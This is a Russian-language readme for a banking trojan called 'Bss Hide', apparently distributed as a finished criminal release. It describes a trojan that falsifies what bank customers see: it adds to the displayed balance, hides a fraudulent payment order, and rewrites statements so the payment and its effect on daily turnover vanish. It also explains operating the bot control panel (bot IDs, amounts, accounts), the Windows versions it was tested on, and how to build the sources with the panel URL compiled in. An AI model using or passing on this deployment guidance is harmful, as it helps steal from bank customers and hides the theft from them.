
Bss Hide. Final Release.
------------------------

1. Содержимое архива.

    ./src/              - исходники
    ./video/            - архив с видео, которое демонстрирует весь функционал
    ./web/              - админка
    final-readme.txt    - этот файл

Первым делом посмотреть видео.
Детально тестировалось на системах:
  WinXP, WinXP SP1, WinXP SP2, WinXP SP3
  Win2003, Win2003 R2 (all SP)
  Win Vista (all SP)
  Win7 (all SP)
  Win8 (all SP)

2. Что представляет из себя.

Трой, выполняющий три функции.
    1) Добавляет баланс на главной
    2) Скрывает платежку
    3) Скрывает платежку в "выписках", добавляет её сумму к остатку за день,
       вычитает её сумму из "оборотов" за день

3. Как работать с админкой.

 Данные о платежке берутся из админки. Админка (control.php) представляет из себя
простейшую таблицу (данные хранятся в data.txt, на который нужно поставить chmod 777),
в которую можно добавлять и удалять данные (bot_id, amount, account), где amount и account -
это, соответственно, сумма платежки, которую нужно скрыть на боте с ID bot_id, а account - номер
счета, с которым мы работаем.

4. Как собирать исходники.

Необходима Visual Studio 2010 SP1 и boost. Пути к include и library boost-а необходимо указать в настройках
студии. Далее нужно открыть

  \projects\vs9\bsshide.sln

и сделать rebuild all, предварительно прописав путь к админке в

  \bsshide_hook_dll\xopts.cpp

в переменной g_url (строка №20).
